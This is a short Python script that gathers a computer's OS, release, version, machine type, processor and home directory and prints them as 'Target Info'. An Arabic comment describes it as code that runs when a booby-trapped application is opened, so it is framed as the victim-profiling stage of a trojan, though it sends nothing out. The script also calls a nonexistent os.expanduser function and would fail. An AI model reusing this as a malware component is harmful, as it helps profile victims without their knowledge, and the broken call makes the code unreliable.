import platform
import os

def get_system_info():
    info = {
        "Platform": platform.system(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "Home_Dir": os.expanduser("~")
    }
    return info

# هذا الجزء سيتم استدعاؤه عند فتح التطبيق الملغم
if __name__ == "__main__":
    data = get_system_info()
    print(f"Target Info: {data}")
